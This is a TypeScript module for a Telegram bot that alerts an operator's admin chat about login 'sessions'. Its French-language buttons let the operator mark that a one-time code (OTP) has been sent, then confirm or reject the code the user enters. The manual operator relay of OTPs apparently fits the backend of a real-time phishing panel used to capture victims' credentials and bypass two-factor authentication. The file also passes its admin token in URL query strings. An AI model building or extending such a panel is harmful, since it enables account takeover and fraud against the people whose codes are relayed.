import { Telegraf, Markup } from "telegraf";
import { logger } from "./logger";
import { db, sessionsTable } from "@workspace/db";
import { eq } from "drizzle-orm";

const TOKEN = process.env.TELEGRAM_BOT_TOKEN ?? "";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID ?? "";
const ADMIN_TOKEN = process.env.ADMIN_TOKEN ?? "";

// ---------------------------------------------------------------------------
// Resolve the public URL of this server.
// In the deployed process, REPLIT_DOMAINS contains the production domain(s).
// A manually set SITE_URL takes priority (useful if auto-detection fails).
// ---------------------------------------------------------------------------
function getSiteUrl(): string {
  if (process.env.SITE_URL) return process.env.SITE_URL.replace(/\/$/, "");
  const domain = process.env.REPLIT_DOMAINS?.split(",")[0]?.trim();
  return domain ? `https://${domain}` : "";
}

function adminActionUrl(sessionId: string, action: string): string {
  const base = getSiteUrl();
  if (!base || !ADMIN_TOKEN) return "";
  return (
    `${base}/api/admin/action` +
    `?sid=${encodeURIComponent(sessionId)}` +
    `&action=${encodeURIComponent(action)}` +
    `&token=${encodeURIComponent(ADMIN_TOKEN)}`
  );
}

// ---------------------------------------------------------------------------
// Singleton bot instance — used for both sending messages and polling
// ---------------------------------------------------------------------------
const bot = new Telegraf(TOKEN);

// Keep callback-based action handlers as a backup (fires if polling works)
bot.action(/^otp_sent:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1]!;
  logger.info({ sessionId }, "Bot action: otp_sent");
  try {
    await db
      .update(sessionsTable)
      .set({ status: "otp_sent" })
      .where(eq(sessionsTable.id, sessionId));
    await ctx.answerCbQuery("📤 OTP marqué comme envoyé");
    await ctx.editMessageText("📤 OTP envoyé — en attente de saisie…");
  } catch (err) {
    logger.error({ err }, "otp_sent action error");
    await ctx.answerCbQuery("Erreur interne").catch(() => {});
  }
});

bot.action(/^confirm:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1]!;
  logger.info({ sessionId }, "Bot action: confirm");
  try {
    await db
      .update(sessionsTable)
      .set({ status: "verified" })
      .where(eq(sessionsTable.id, sessionId));
    await ctx.answerCbQuery("✅ OTP confirmé !");
    await ctx.editMessageText("✅ OTP confirmé — utilisateur connecté.");
  } catch (err) {
    logger.error({ err }, "confirm action error");
    await ctx.answerCbQuery("Erreur interne").catch(() => {});
  }
});

bot.action(/^reject:(.+)$/, async (ctx) => {
  const sessionId = ctx.match[1]!;
  logger.info({ sessionId }, "Bot action: reject");
  try {
    await db
      .update(sessionsTable)
      .set({ status: "rejected" })
      .where(eq(sessionsTable.id, sessionId));
    await ctx.answerCbQuery("❌ OTP rejeté");
    await ctx.editMessageText("❌ OTP rejeté.");
  } catch (err) {
    logger.error({ err }, "reject action error");
    await ctx.answerCbQuery("Erreur interne").catch(() => {});
  }
});

// ---------------------------------------------------------------------------
// Keyboard builders — prefer URL buttons (work without polling/webhooks)
// ---------------------------------------------------------------------------

export function buildLoginKeyboard(sessionId: string) {
  const otpUrl = adminActionUrl(sessionId, "otp_sent");
  if (otpUrl) {
    return Markup.inlineKeyboard([
      [Markup.button.url("📤 OTP Envoyé", otpUrl)],
    ]);
  }
  // Fallback: callback button (requires bot polling)
  return Markup.inlineKeyboard([
    [Markup.button.callback("📤 OTP Envoyé", `otp_sent:${sessionId}`)],
  ]);
}

export function buildOtpKeyboard(sessionId: string) {
  const confirmUrl = adminActionUrl(sessionId, "confirm");
  const rejectUrl = adminActionUrl(sessionId, "reject");
  if (confirmUrl && rejectUrl) {
    return Markup.inlineKeyboard([
      [
        Markup.button.url("✅ Confirmer", confirmUrl),
        Markup.button.url("❌ Rejeter", rejectUrl),
      ],
    ]);
  }
  // Fallback: callback buttons
  return Markup.inlineKeyboard([
    [
      Markup.button.callback("✅ Confirmer", `confirm:${sessionId}`),
      Markup.button.callback("❌ Rejeter", `reject:${sessionId}`),
    ],
  ]);
}

// ---------------------------------------------------------------------------
// Send a message to the configured admin chat
// ---------------------------------------------------------------------------

export async function sendMessage(
  text: string,
  extra?: object,
): Promise<void> {
  if (!TOKEN || !CHAT_ID) return;
  try {
    await bot.telegram.sendMessage(CHAT_ID, text, {
      parse_mode: "Markdown",
      ...(extra ?? {}),
    } as Parameters<typeof bot.telegram.sendMessage>[2]);
  } catch (err) {
    logger.error({ err }, "sendMessage failed");
  }
}

// ---------------------------------------------------------------------------
// Start long-polling (optional — URL buttons don't need this)
// ---------------------------------------------------------------------------

export function startPolling(): void {
  if (!TOKEN || !CHAT_ID) {
    logger.warn("Telegram credentials missing — bot disabled");
    return;
  }

  logger.info("Telegraf bot launching…");

  try {
    bot
      .launch({ allowedUpdates: ["callback_query"] })
      .catch((err: unknown) => logger.error({ err }, "Telegraf polling error"));

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));
  } catch (err) {
    // bot.launch() threw synchronously — log and continue
    // (URL buttons still work without polling)
    logger.error({ err }, "Telegraf bot.launch() threw — polling disabled, URL buttons still active");
  }

  logger.info("Telegraf polling started (URL buttons active regardless)");
}
